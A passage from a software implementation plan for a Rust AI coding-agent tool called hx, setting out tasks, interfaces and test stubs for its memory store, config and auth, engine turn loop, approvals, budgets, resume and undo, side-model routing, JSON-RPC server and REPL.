  - `enum MemoryKind { Convention, Fact, Gotcha, Command }`; `struct MemAnchor { path: PathBuf, symbol: Option<String>, hash: String }`
  - `struct MemoryEntry { id: String, title: String, kind: MemoryKind, anchors: Vec<MemAnchor>, created: SystemTime, verified: Option<SystemTime>, body: String, stale: bool /* not serialized */ }` — file format: YAML frontmatter + markdown body
  - `struct MemoryDraft { id: Option<String>, title: String, kind: MemoryKind, anchors: Vec<(PathBuf, Option<String>)>, body: String }`
  - `struct MemoryChange { upsert: Option<MemoryEntry>, delete: Vec<String> }`
  - `struct MemoryStore` with `fn open(project_root: &Path, index: Arc<Index>) -> Result<Self, MemoryError>`, `fn entries(&self) -> &[MemoryEntry]`, `fn refresh_staleness(&mut self) -> usize`, `fn index_block(&self, budget_tokens: u32, est: &dyn Fn(&str) -> u32) -> (String, bool /* over budget */)`, `fn draft_to_change(&self, d: MemoryDraft, est: &dyn Fn(&str) -> u32) -> Result<MemoryChange, MemoryError>` (fills anchor hashes; body > 300 tokens → `MemoryError::TooLong`), `fn apply(&mut self, c: &MemoryChange) -> Result<(), MemoryError>`, `fn search(&self, query: &str, k: usize, cap_tokens: u32, est: &dyn Fn(&str) -> u32) -> Vec<Hit>`, `fn write_episode(&self, session_id: &str, markdown: &str) -> Result<PathBuf, MemoryError>`, `fn consolidation_request(&self) -> String` (prompt listing all entries for the side model), `fn parse_consolidation(&self, reply: &str) -> Result<Vec<MemoryChange>, MemoryError>` (expects a JSON array of `{merge: [ids], into: {title, kind, body}}` / `{delete: id}`)
  - `struct Hit { source: HitSource /* Project(id) | Episode(session_id) */, title: String, text: String, stale: bool, score: f32 }`
  - `RecallTool` (`ReadOnly`), `RememberTool` (`ReadOnly`; returns `proposed; awaiting user approval` and writes nothing). Final registry order: `read, edit, write, bash, grep, glob, outline, symbol, refs, web_fetch, recall, remember, pin, state` (`assemble` sorts tools by name before they reach a provider, so registry order has no effect on the wire or on caching).

- [ ] **Step 1: Write the failing tests**

```rust
#[test] fn entry_roundtrips_through_frontmatter_file() {}
#[tokio::test] async fn anchored_symbol_change_marks_stale() {
    let (t, idx, mut m) = setup(&[("lib.rs","fn a(){1}\nfn b(){2}")]);
    m.apply(&m.draft_to_change(draft_anchored("lib.rs", Some("a")), &est).unwrap()).unwrap();
    write(t.path().join("lib.rs"), "fn a(){9}\nfn b(){2}"); idx.reindex_file(Path::new("lib.rs")).await.unwrap();
    assert_eq!(m.refresh_staleness(), 1); assert!(m.entries()[0].stale);
}
#[tokio::test] async fn change_to_other_symbol_does_not_mark_stale() {}
#[test] fn index_block_marks_stale_and_respects_500_token_budget_dropping_oldest_unverified_first() {}
#[test] fn search_ranks_relevant_entry_first() { /* "pnpm" query → convention "use pnpm not npm" ranked 1 */ }
#[test] fn search_includes_episodes_and_caps_at_2000_tokens() {}
#[test] fn draft_body_over_300_tokens_rejected() {}
#[test] fn parse_consolidation_produces_merge_and_delete_changes() {}
#[tokio::test] async fn remember_tool_emits_context_op_and_writes_nothing() {}
#[tokio::test] async fn recall_tool_flags_stale_hits() {}
#[test] fn registry_order_is_stable() { /* final order above */ }
```

- [ ] **Step 2: Run** `cargo test -p hx-memory && cargo test -p hx-tools --test memory_tools` — Expected: FAIL.
- [ ] **Step 3: Implement.** Entry id = slug of title + 4 hex chars. BM25 (k1 = 1.2, b = 0.75) over lowercase alphanumeric tokens of title + body, built in memory at open (corpus is small); episodes loaded lazily on first search. Anchors without a `symbol` use `file_hash`.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(memory): code-anchored memory store, recall and remember tools"`

### Task 23: Config, auth, protocol types

**Files:**
- Create: `crates/hx-core/src/{lib.rs,protocol.rs,config.rs,auth.rs}`
- Test: `crates/hx-core/tests/{config.rs,protocol.rs}`
- No edits outside `hx-core`: the serde derives `Event` needs on other crates' types were done in fix wave B (see Consumes).

**Interfaces:**
- Consumes: serde derives from fix wave B on hx-tools `AppliedEffect`/`Shown`/`LineRange`/`ToolMeta` (and `PersistedEffect`, `pre_image` bytes as blob references), hx-memory `MemoryChange`/`MemoryEntry`/`MemAnchor`, and hx-context `Breakdown`/`ContextStatus`/`MutationReason`/`GcRecord`/`CompactionRecord` (hx-context now depends on `serde`). `PathBuf` serde fails on non-UTF-8 paths (Linux): events show such a path lossily (`to_string_lossy`); persisted records skip it with a warning (Task 24 note)
- Produces:
  - `struct Config { model: ModelId, providers: ProvidersConfig, permissions: PolicyConfig, compaction_threshold: Option<f32> /* 0.8 */, max_turns: u32 /* 100 */, turn_timeout_s: Option<u64>, budget: BudgetConfig, telemetry: TelemetryConfig /* enabled=false */, pins: Vec<String>, catalog_overrides: Option<Catalog>, routing: RoutingConfig { side_model: Option<ModelId> }, approve_memory: bool /* false */ }`
  - `fn Config::load(root: &Path, cli: CliOverrides) -> Result<Config, ConfigError>` — user then project then CLI; tables merge deeply, arrays replace
  - `struct ProvidersConfig { anthropic: Option<ProviderEntry>, openai: Option<ProviderEntry>, google: Option<ProviderEntry>, compat: Vec<CompatEntry> }`; `struct ProviderEntry { base_url: Option<Url>, api_key_env: Option<String> }`; `struct CompatEntry { name: String, base_url: Url, api_key_env: Option<String> }`
  - `fn auth::api_key(provider: &str, entry: &ProviderEntry) -> Result<Option<String>, AuthError>` — env var (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GEMINI_API_KEY`, or configured name) then keychain service `hx`, account = provider
  - `enum Event` and `enum Command` exactly as spec §3.2/§3.3 (including `Usage.role: UsageRole { Main, Side }`, `ContextCollected`, `MemoryProposed{proposal_id, change: MemoryChange}`, `SessionChanged`, `ApproveMemory`, `RejectMemory`, `ConsolidateMemory`; `ToolFinished.blocked: bool`; `Compacted.reason` / `ContextCollected.reason` as `MutationReason`; `MemoryChange { upsert: Option<MemoryEntry>, delete: Vec<String> }` re-exported from `hx-memory`), `#[serde(tag = "type", rename_all = "snake_case")]`; `enum FinishReason { Completed, Cancelled, Budget, MaxTurns, Timeout, Error }`; `enum ErrorKind { ProviderTransient, ProviderFatal, ContextOverflow, Tool, Policy, Internal }`
  - `const PROTOCOL_VERSION: (u32, u32) = (1, 0)`

- [ ] **Step 1: Write the failing tests:** `project_overrides_user_and_cli_overrides_project`; `arrays_replace_not_concat`; `defaults_match_spec` (threshold 0.8, telemetry disabled, mode Ask); `env_key_wins_over_keychain` (keychain mocked via trait); `event_json_shape_is_stable` (insta snapshot of one of each `Event` variant); `command_roundtrip`.
- [ ] **Step 2: Run** `cargo test -p hx-core --test config --test protocol` — Expected: FAIL.
- [ ] **Step 3: Implement.** Wrap keychain behind `trait SecretStore` so tests inject a fake.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core): config layering, auth, protocol types"`

### Task 24: Engine turn loop and approvals

**CP3 round-2 note (binding):** apply a tool call's `ContextOp` before its result is sent to the model; if `Context::pin`/`apply_op` returns an error (e.g. `PinError::TooMany`, over-size), replace that call's result with the error text so the model never believes a refused pin was kept.

**Client-protocol amendment (binding, user-approved 2026-11-03; spec 3.4):** `EngineBuilder` takes an optional shared `Arc<Workspace>` (index, watcher, memory store for one root) so several engines in one process share them; without it the builder opens its own. Approval requests carry a `request_id`, and `Command::Approve`/`Deny` name it.

**Task 38 review note (binding):** build the repo map off the startup path (spawn_blocking) once per session; on a first-ever session with no ready index the map is empty for that session — acceptable in v1, but log it. Call `init_repo_map` exactly once at session start, ignore a `false` return, never retry per turn (a later success would change the stable prefix mid-session). Before the first `assemble`, await both the repo map and the first memory index for a bounded ~300 ms (otherwise request 2's stable prefix differs and the cache is lost); on timeout the slot stays empty for the session. Read-tracker turn numbers and `Context` turn numbers are the same absolute step counter (Task 20's `CompactionRecord` reports the last removed absolute turn; pass it to `ReadTracker::forget_shown_at` and call `ReadTracker::forget_path` for every `CompactionRecord.forgotten_paths` entry).

**Task 21 review note (binding):** at every step start (before each provider request) compute `gc_decision` and `compaction_decision` together; if either fires, apply both in the same cache epoch (`collect(gc.or(compaction))`, then compaction if pending, then the pending memory index per Task 28) so the prefix breaks once. Call `Context::fold_session_pins()` on any applied epoch, including `ColdCache` (also when nothing is collected), so session pins do not pile up in the uncached tail. On resume, rebuild `Context.results` by replaying `push_tool_result(call_id, tool, args, effects, is_error, turn)` from the logged `ToolResult` records (effects included), re-apply the logged `GcApplied` records with `Context::reapply_gc` (Task 26) and the `MemoryIndexApplied` records, and set `Context.root` to the canonical root.

**Task 20 review note (binding):** turn numbers are 1-based everywhere (`Context::next_turn()` is the number passed to `ToolCx::with_turn`, read before the step's `Turn` is pushed); if the summarizer request still fails (provider overflow or error), fall back to dropping the oldest removable turns without a summary (`apply_compaction(removed, String::new())`, announced via `Compacted{reason}`), never loop retrying the same request; the same fallback applies when `apply_compaction` returns `CompactError::SummaryTooLong`. A resumed session sets `Context.first_turn` from the session log. On cancel or crash recovery, every `tool_use` without a result gets a synthetic error result (`cancelled`) so no unanswered call pins the compaction cut.

**Task 19 re-review note (binding):** after each provider response call `Context::calibrate(&status, &usage)` with the `ContextStatus` of the request just sent (it sums `input + cache_read + cache_write` and uses the flat tokens recorded in `status`; never `usage.input` alone, never `TokenEstimator::calibrate`), and `Context::note_request(at, status.cached_prefix)` (`ContextStatus.cached_prefix` is the token length up to the last breakpoint, so the engine never re-sums block estimates); when a response is cut off right after a reasoning item, drop that trailing reasoning item from history; on a mid-session model switch to another provider, strip `Reasoning`/`RedactedReasoning` content produced by a different provider before the next request (redacted payloads are provider-specific).

**Task 19 review note (binding):** every step ends in the plain-text state tail, which a provider may treat as a new user turn and so drop earlier reasoning; a mock cannot observe that. Task 35's live smoke suite runs, per provider, a three-step tool loop with reasoning on and compares reasoning/cache tokens with and without the state tail; if continuity is lost, switch that adapter to place the state inside the last tool result's content (Anthropic `tool_result` content blocks, OpenAI `function_call_output.output`, Gemini `functionResponse.response`) using the `CanonicalRequest.volatile_tail` marker (fix wave B), with the last breakpoint on the block before it. The engine passes a canonicalized root (same canonicalization as the sandbox) into `Context.root` and calls `agents_md::load(&sandbox)` + `Context::set_agents_md` exactly once; a user `/pin` (`Command::Pin`) calls `Context::pin(text, PinSource::User)` and reports a `PinError` to the user. The sandbox root is the git top level when the start directory is inside a git work tree (else the start directory); an ancestor `AGENTS.md` above that root follows the confinement rule of spec 6.1 (its link target must stay inside the directory holding it).

**Checkpoint 2 amendments (binding):** Ordering: partition calls into maximal runs; consecutive ReadOnly calls run concurrently; every Write/Exec/Network call is a barrier executed alone in model order; ContextOps (pin/state/remember) apply in model order after each run. Index: open it on a blocking task AFTER the first event (ToolCx gets `index: None` until ready), start the watcher (`Index::start_watcher`) and keep the `WatchHandle` in the actor; if the watcher fails or stops (`watching()` false) tools treat the index as stale. Emit `last_error()` once as a status warning. On Cancel, forget every read baseline committed by results that are not appended (use effects' `shown`). Write-generation bumps on `Edited | Deleted | Exec`. Resume replays ToolCall records through `parse_context_op` (ContextOp has no serde). Run spill cleanup at engine start.

**Checkpoint 3 amendments (binding):** (1) A context `Turn` is one provider step (assistant message plus its tool results; the user's prompt is its own turn). GC and compaction decisions run at every step start, `max_turns` counts steps, `TurnStarted`/`TurnFinished` stay per user message, and `next_turn()` is read before the step's `Turn` is pushed. (2) After a concurrent run, push tool results to `Context` (`push_tool_result` and history) in model order, not finish order. (3) Persist the contents of GC and compaction records as session blobs (the originals of GC-elided results are already each `ToolResult`'s result blob, so `GcApplied` stores ids only; `CompactionRecord.removed_turns` are blobs) and keep only references plus the latest compaction record in memory. (4) Tool order on the wire is `assemble`'s name sort; `registry()` order does not matter for caching. (5) Apply the pending memory index text only as Task 28 describes. (6) A persisted record whose path is not valid UTF-8 (Linux) must not abort the session log: the engine skips that path's entry in the persisted `effects`/`Edit` records and emits a warning status event (`non-UTF-8 path not tracked`); in memory the effect applies normally, so only resume and undo lose it.

**Files:**
- Create: `crates/hx-core/src/{engine.rs,turn.rs,approvals.rs}`
- Test: `crates/hx-core/tests/engine_loop.rs`

**Interfaces:**
- Consumes: everything above.
- Produces:
  - `struct EngineBuilder { config: Config, root: PathBuf, provider: Option<Arc<dyn Provider>>, sandbox: Option<Arc<dyn Sandbox>>, resume: Option<String> }` with `fn build(self) -> Result<(Engine, mpsc::Receiver<Event>), EngineError>` (event channel capacity 256)
  - `struct Engine` with `async fn send(&self, cmd: Command) -> Result<(), EngineError>` and `fn session_id(&self) -> &str`
  - Session record type `enum SessionRecord { Command(Command), Request { hash: BlobRef }, Provider(ProviderEvent), ToolCall { id: String, name: String, args: Value }, ToolResult { id: String, result_blob: BlobRef, is_error: bool, effects: Vec<PersistedEffect>, meta: ToolMeta }, Edit { path: PathBuf, pre_image: Option<BlobRef>, turn: u32 }, Compaction { removed: Vec<BlobRef>, summary: String }, GcApplied { elided: Vec<(String /* call_id */, u32 /* stub turn */)>, reason: MutationReason, tokens_freed: u32, forgotten_paths: Vec<PathBuf> }, MemoryIndexApplied { text: String }, TurnEnd { reason: FinishReason } }` (`PersistedEffect` mirrors `AppliedEffect` with `pre_image` bytes stored as blob references; `GcApplied` holds no text, the originals are already in each `ToolResult`'s blob; with `GcApplied` and `MemoryIndexApplied`, resume reproduces the exact prefix, re-applying `GcApplied` via `Context::reapply_gc(&GcApplied)`, added in Task 26)

- [ ] **Step 1: Write the failing tests** (all use `MockProvider` + `LocalSandbox` on a tempdir)

```rust
#[tokio::test] async fn text_only_turn_completes() { /* events: TurnStarted, TextDelta*, Usage, ContextStatus, TurnFinished{Completed} */ }
#[tokio::test] async fn tool_loop_runs_until_no_tool_calls() { /* mock: [ToolCall read] then [text] → two provider requests; second contains ToolResult */ }
#[tokio::test] async fn ask_emits_approval_and_waits() { /* write tool in Ask mode → ToolApprovalRequested; nothing written until Approve; Deny → ToolResult is_error "denied by user" */ }
#[tokio::test] async fn read_only_calls_run_concurrently_writes_sequentially() { /* two grep calls overlap (timestamps); two writes don't */ }
#[tokio::test] async fn malformed_tool_args_return_error_result_and_continue() { /* input_json "{not json" → ToolResult is_error, next request sent, turn completes */ }
#[tokio::test] async fn unknown_tool_name_returns_error_result() {}
#[tokio::test] async fn policy_deny_reports_rule() { /* deny rule → Error{kind: Policy} not emitted; ToolResult contains rule text */ }
#[tokio::test] async fn mid_stream_drop_reissues_from_last_complete_message() { /* DropAfter([ToolCall partial]) then full → tool executed exactly once */ }
#[tokio::test] async fn records_appended_before_events_visible() { /* on receipt of ToolFinished, session file already contains ToolResult */ }
#[tokio::test] async fn pin_and_state_tools_update_context() {}
#[tokio::test] async fn context_gc_runs_only_at_step_start_and_emits_context_collected() { /* script re-reads a large file 6× in one prompt; ContextCollected emitted between provider requests (before a step's request), never while a step's tools run */ }
#[tokio::test] async fn identical_failed_call_with_no_writes_since_is_blocked() { /* bash `cargo test` fails twice in script → second not executed, ToolFinished.blocked == true, result mentions "already tried at turn" */ }
#[tokio::test] async fn blocked_call_repeated_immediately_runs() {}
#[tokio::test] async fn write_since_failure_unblocks_retry() {}
#[tokio::test] async fn failed_attempts_appear_in_working_state_capped_at_10() {}
#[tokio::test] async fn edits_reindex_before_result_returned() { /* edit then symbol in same turn sees new body */ }
#[tokio::test] async fn max_turns_stops() { /* max_turns=2 counts steps; mock always calls a tool → TurnFinished{MaxTurns} */ }
```

- [ ] **Step 2: Run** `cargo test -p hx-core --test engine_loop` — Expected: FAIL.
- [ ] **Step 3: Implement.** Engine runs one actor task owning `Context`, `SessionWriter`, `Policy`, `ReadTracker`; commands arrive on an mpsc; each turn is a child task with a child `CancellationToken`. Loop breaker (spec 7.8) lives in `crates/hx-core/src/attempts.rs`: `struct AttemptLedger` with `fn check(&mut self, tool: &str, args: &Value) -> Option<BlockedBy>` and `fn record(&mut self, tool, args, turn, ok: bool, signature: &str)`, plus a write-generation counter bumped on `Edited | Deleted | Exec`. Engine owns `Arc<Index>` (opened on a blocking task after the first event is emitted, `ToolCx` gets `index: None` until ready; `spawn_background_refresh` started once open, so start-up is not delayed) and passes it, the step's turn number and the spill dir in `ToolCx`; record every tool result with `Context::push_tool_result(call_id, tool, args, effects, is_error, turn)`; at every step start (and only then) compute `gc_decision`/`compaction_decision`, apply them as one epoch via `Context::collect(reason)` and compaction, and persist the result (`GcApplied`). Tool calls resolve through `registry()`; `Approve`/`Deny` resolve pending approvals by `request_id` via a `HashMap<String, oneshot::Sender<bool>>`. Provider is wrapped in `Retrying`. Checkpoint the session at every tool boundary and turn end.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core): engine turn loop, approvals, tool dispatch"`

### Task 25: Cancellation, budgets, ledger, signals

**Checkpoint 2 amendments (binding):** The process-group registry also reaps per-call bash reader tasks/fds on return; spill cleanup (age/size cap) runs at engine start if Task 24 didn't add it.

**Files:**
- Create: `crates/hx-core/src/{budget.rs,ledger.rs}`; modify `engine.rs`, `turn.rs`
- Test: `crates/hx-core/tests/{cancel_budget.rs,ledger.rs}`

**Interfaces:**
- Produces: `struct Budget { max_usd: Option<f64>, max_tokens: Option<u64> }`; `fn Budget::check(&self, spent_usd: f64, spent_tokens: u64) -> BudgetState`; `enum BudgetState { Ok, Warn, Exceeded }` (Warn at ≥ 80%); `struct Ledger::open(path: &Path) -> Result<Ledger>` (WAL, `busy_timeout` 5 s); `fn Ledger::record(&self, session: &str, model: &ModelId, usage: &RawUsage, cost: Option<f64>) -> Result<()>`; `fn Ledger::totals(&self, since: SystemTime) -> Result<Totals>`; `fn install_signal_handlers(engine: Engine)` (SIGINT handled by clients; SIGTERM/SIGHUP → `Command::Shutdown`).

- [ ] **Step 1: Write the failing tests:** `cancel_ends_turn_with_cancelled_and_kills_children_within_200ms` (bash `sleep 300` running; send `Cancel`; `TurnFinished{Cancelled}` within 250 ms; no `sleep` processes); `budget_warns_at_80_percent`; `budget_exceeded_finishes_inflight_tool_then_stops` (`TurnFinished{Budget}`; the in-flight tool's result is recorded); `turn_timeout_finishes_with_timeout`; `usage_event_includes_cost_and_quota`; `ledger_two_processes_concurrent_writes` (two `Ledger` handles on same file from two threads, 500 inserts each, totals == 1000); `shutdown_kills_all_process_groups_and_session_is_resumable` (send `Shutdown` mid-bash; reopen reader; `truncated_tail` false, last record is `TurnEnd{Cancelled}` or turn detectably incomplete).
- [ ] **Step 2: Run** `cargo test -p hx-core --test cancel_budget --test ledger` — Expected: FAIL.
- [ ] **Step 3: Implement.** Budget is checked after each `Usage`; on `Exceeded` set a flag that stops the loop at the next tool boundary.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core): cancellation, budgets, cost ledger, signal handling"`

### Task 26: Resume, fork, undo, compaction wiring

**Checkpoint 2 amendments (binding):** Fork gives the child a fresh ReadTracker; undo uses `Edited.pre_image/pre_mode` and `Deleted` (restore file + mode).

**Checkpoint 3 amendments (binding):** `rebuild` replays the `ToolResult` records' `effects`/`meta` through `push_tool_result` and `apply_effects`, and the `GcApplied`/`MemoryIndexApplied` records (Task 24), so the files list, `Context.results`, GC elisions and the memory index text are exactly as before. GC originals and `CompactionRecord` contents are read back from session blobs (each `ToolResult`'s result blob by call id for `restore_gc`; only references and the latest compaction record stay in memory), which `Uncompact` and `restore_gc` use. Add `Context::reapply_gc(&GcApplied)` (elide the listed call ids with their stub turns and restore `forgotten_paths` handling), used by `rebuild`. Fork copies the parent's records verbatim (no re-serialization, so fields a newer version added survive).

**Files:**
- Create: `crates/hx-core/src/resume.rs`; modify `engine.rs`
- Test: `crates/hx-core/tests/resume.rs`

**Interfaces:**
- Produces: `fn resume::rebuild(reader: &SessionReader<SessionRecord>) -> Result<Rebuilt, ResumeError>`; `struct Rebuilt { context: Context, incomplete_turn: bool, turn_count: u32 }`; engine handles `Command::Fork` (opens a new writer with `parent=(id, offset)` and emits `Event::SessionChanged{session_id}`), `Command::Compact`, `Command::Uncompact`; `fn undo(reader, sandbox, turn: Option<u32>) -> Result<Vec<PathBuf>, UndoError>` restoring pre-images of the given (default last) turn in reverse order, deleting files whose pre-image is `None`.

- [ ] **Step 1: Write the failing tests:** `resume_rebuilds_context_identically` (assembled request after resume == before, including the files list, GC elisions and memory index text); `resume_after_crash_mid_turn_marks_incomplete_and_continues_on_next_message`; `fork_creates_child_with_parent_offset`; `auto_compaction_announced_before_running` (`Compacted` preceded by `ContextStatus` with warning "compacting"); `context_overflow_compacts_and_retries_once`; `uncompact_command_restores` (also restores GC elisions via `restore_gc`); `undo_last_turn_restores_files`; `undo_deletes_files_created_in_turn`.
- [ ] **Step 2: Run** `cargo test -p hx-core --test resume` — Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core): resume, fork, undo, compaction wiring"`

### Task 27: Side-model routing

**Files:**
- Create: `crates/hx-core/src/routing.rs`; modify `crates/hx-provider/src/{lib.rs,catalog.rs}` (add `trait SideModel` and `tier`), `crates/hx-provider/catalog/models.toml`, `crates/hx-tools/src/web_fetch.rs`, `crates/hx-core/src/{engine.rs,turn.rs}`
- Test: `crates/hx-core/tests/routing.rs`

**Interfaces:**
- Consumes: `Config.routing` (Task 23), `compaction_request` (Task 20), `Ledger` and `Budget` (Task 25).
- Produces: `enum Tier { Small, Large }` and `ModelInfo.tier: Option<Tier>`; `#[async_trait] trait SideModel: Send + Sync { async fn complete(&self, system: &str, user: &str, max_tokens: u32) -> Result<String, ProviderError>; }` (in `hx-provider`); `fn routing::side_model_id(cfg: &Config, catalog: &Catalog) -> ModelId`; `struct SideRunner { provider: Arc<dyn Provider>, model: ModelId, usage: mpsc::Sender<Usage> }` implementing `SideModel` and reporting `Usage{role: Side}`; `ToolCx` gains `side: Option<Arc<dyn SideModel>>`; `web_fetch` arg `question: Option<String>`.

- [ ] **Step 1: Write the failing tests:** `default_side_model_is_small_tier_of_same_provider`; `falls_back_to_main_model_when_no_small_tier`; `config_side_model_overrides_default`; `compaction_summary_requested_from_side_model_not_main` (two `MockProvider`s; inspect `requests()`); `side_usage_has_role_side_and_counts_toward_budget_and_ledger`; `web_fetch_with_question_returns_answer_and_url_capped_at_1000_tokens`; `web_fetch_without_question_unchanged`.
- [ ] **Step 2: Run** `cargo test -p hx-core --test routing` — Expected: FAIL.
- [ ] **Step 3: Implement.** Mark Haiku-class, `-mini`, and Flash-class catalog entries `tier = "small"`. Side requests carry no tools and no reasoning.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core): side-model routing for compaction, memory and web_fetch"`

### Task 28: Memory in the engine

**Task 22 note (binding):** call `MemoryStore::refresh_staleness()` once the index is ready and before building the first memory index block (the engine awaits it for ~300 ms before the first `assemble`; on timeout the slot stays empty for the session); route `ContextOp::Remember` to the approval flow only when the `remember` result is not an error. Surface `MemoryStore::skipped_count()` and `staleness_error()` to the user (status line or warning event) at session start.

**Task 19 review note (binding):** the memory index lives in the cached system prefix, so `[stale]` flags and index content change only at session start, inside a cache epoch chosen by the scheduler (spec 7.7), when `decide` returns `ColdCache`, or when a new user turn starts with a cold cache; never while the cache is warm. `MemoryStore::refresh_staleness` and `apply` change engine-visible state (also called by `RecallTool` and `ApproveMemory`), so their results are held as pending text and never rendered into `Context` directly.

**Checkpoint 2 amendments (binding):** Refresh memory staleness after bash only once the index is fresh (`!is_stale()`); use `wait_ready(timeout)`.

**Files:**
- Create: `crates/hx-core/src/memory.rs`; modify `engine.rs`, `turn.rs`, `resume.rs`
- Test: `crates/hx-core/tests/memory.rs`

**Interfaces:**
- Consumes: `MemoryStore`, `MemoryChange`, `ContextOp::Remember` (Task 22); `SideModel` (Task 27); `Context.memory_index` (Task 19).
- Produces: engine behavior only — `MemoryProposed{proposal_id, change}` emitted for each `Remember` op and each consolidation change; `ApproveMemory` applies, `RejectMemory` discards; `ConsolidateMemory` asks the side model via `consolidation_request` and emits one proposal per parsed change; episodes written via the side model at `Shutdown`/session end and after each compaction; `refresh_staleness` at build and after every step that applied an `Edited` effect (and on `ApproveMemory` applies) updates the store only; the engine keeps a pending memory-index text (`index_block(500, …)`) and renders it into `Context.memory_index` only when (a) a GC/compaction epoch is applied, (b) the cache is cold (`decide` → `ColdCache`), or (c) a new user turn starts with a cold cache, logging each rendering as `MemoryIndexApplied{text}`; `recall` reports freshly stale hits in its output only (`[STALE…]`) and never changes the prefix; when `index_block` reports over budget, `ContextStatus.warnings` gains `memory index over budget — run /memory consolidate`. Session records gain `MemoryProposal { id, change }` and `MemoryDecision { id, approved }` so pending proposals survive resume.

- [ ] **Step 1: Write the failing tests:** `memory_index_rendered_after_agents_md_in_stable_block`; `remember_emits_proposal_and_writes_file_only_after_approve`; `reject_writes_nothing`; `stale_flag_appears_at_next_cache_epoch` (edit an anchored symbol: the next request's `memory_index` is unchanged while the cache is warm and shows `[stale]` after an epoch or a cold cache); `episode_written_by_side_model_at_shutdown`; `episode_written_after_compaction`; `over_budget_index_adds_warning`; `consolidate_emits_proposals_and_applies_only_approved`; `pending_proposal_survives_resume`.
- [ ] **Step 2: Run** `cargo test -p hx-core --test memory` — Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core): memory proposals, staleness, episodes, consolidation"`

### Task 29: JSON-RPC server and `hx -p` one-shot

**Client-protocol amendment (binding, user-approved 2026-11-03; spec 3.4):** `initialize` accepts `client: {interactive, name, version}`; interactive clients get `ToolApprovalRequested{request_id}` / `MemoryProposed` answered by `approve`/`deny`/`approve_memory`/`reject_memory` with ids, and pending requests resolve to deny on disconnect or `shutdown`. Add `session/new {root, resume?, fork?}`, `session/list`, `session/close`; session-scoped methods take `session_id`; `event` notifications carry `session_id`. Sessions on one root share a `Workspace` hub (index, watcher, memory store; `Arc`, opened once, closed with the last session). Tests: `interactive_ask_waits_for_client_approval`, `pending_approval_denied_on_disconnect`, `two_sessions_share_one_index_and_route_events_by_session_id`, `single_session_form_still_works`.

**Files:**
- Create: `crates/hx-rpc/src/{lib.rs,jsonrpc.rs,server.rs,oneshot.rs}`, `crates/hx-cli/src/main.rs` (clap skeleton: `hx [-p PROMPT] [--output json|text] [--approve auto-edit|yolo] [--model ID] [--budget-usd N] [--approve-memory] [--continue] [--resume ID] [--rpc]`; `--budget-usd` sends `SetBudget{scope: session}` before the first message)
- Test: `crates/hx-rpc/tests/{server.rs,oneshot.rs}`, golden files under `crates/hx-rpc/tests/snapshots/`

**Interfaces:**
- Consumes: `Engine`, `Event`, `Command`, `PROTOCOL_VERSION`.
- Produces: `async fn serve(engine: Engine, events: mpsc::Receiver<Event>, stdin: impl AsyncBufRead, stdout: impl AsyncWrite) -> Result<()>`; methods `initialize` (returns `{protocol: "1.0", session_id}`; rejects major ≠ 1), `send_message`, `approve`, `deny`, `cancel`, `set_budget`, `compact`, `uncompact`, `pin`, `unpin`, `approve_memory`, `reject_memory`, `consolidate_memory`, `fork`, `shutdown`; notifications `event` with the serialized `Event`. `async fn run_oneshot(engine, events, prompt: String, output: OutputFormat, out: impl AsyncWrite) -> i32` (exit code).

- [ ] **Step 1: Write the failing tests:** `initialize_negotiates_version`; `rejects_major_version_mismatch`; `methods_map_to_commands`; `events_become_notifications_ndjson` (each line valid JSON-RPC); `oneshot_json_golden` (insta snapshot of full event stream for a scripted mock run); `oneshot_text_prints_text_only`; `exit_codes` (completed 0, error 1, budget 2, max_turns 2, timeout 2, cancelled 130); `headless_ask_becomes_deny_without_approve_flag`; `headless_with_approve_auto_edit_allows_edits`; `headless_memory_proposal_rejected_without_flag_and_written_with_approve_memory`; `malformed_json_line_returns_parse_error_and_continues`.
- [ ] **Step 2: Run** `cargo test -p hx-rpc` — Expected: FAIL.
- [ ] **Step 3: Implement.** Provider selection in `hx-cli` from `model` prefix (`anthropic/`, `openai/`, `google/`, `compat:<name>/`). Hidden test flag `--mock-script <file>` (cfg feature `mock`) wires `MockProvider` for golden and perf tests.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(rpc): JSON-RPC server and hx -p one-shot mode"`

### Task 30: Interactive REPL stub

**Checkpoint 3 note (binding):** the sandbox root is the git top level when the start directory is inside a git work tree (else the start directory); the REPL and `hx -p` build the engine with that root, and an ancestor `AGENTS.md` above it follows spec 6.1's confinement rule (its link target must stay inside the directory holding it).

**Files:**
- Create: `crates/hx-tui/src/{lib.rs,repl.rs,render.rs}`; modify `crates/hx-cli/src/main.rs` (no `-p` and stdin is a TTY → REPL)
- Test: `crates/hx-tui/tests/repl.rs`

**Interfaces:**
- Produces: `async fn run_repl(engine: Engine, events: mpsc::Receiver<Event>, input: impl AsyncBufRead, out: impl AsyncWrite) -> Result<()>`; `fn render::event(e: &Event) -> Option<String>`.

- [ ] **Step 1: Write the failing tests** (scripted stdin, captured stdout): `prints_streamed_text`; `approval_prompt_y_approves_n_denies`; `shows_context_and_cost_after_each_turn` (line matching `ctx \d+/\d+ tok · \$\d+\.\d{4}`); `slash_commands_map` (`/pin x` → `Pin`, `/compact`, `/fork`, `/undo`, `/memory consolidate` → `ConsolidateMemory`); `memory_proposal_shows_entry_and_y_approves_n_rejects`; `context_collected_prints_tokens_freed`; `ctrl_c_once_cancels_twice_exits` (simulate via injected signal stream); `unknown_slash_command_prints_help`.
- [ ] **Step 2: Run** `cargo test -p hx-tui` — Expected: FAIL.
- [ ] **Step 3: Implement.** Plain line output, no alternate screen.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tui): line-mode interactive REPL stub"`

### Task 31: CLI utility commands

**Files:**
- Create: `crates/hx-cli/src/cmd/{prompt.rs,sessions.rs,models.rs,undo.rs}`
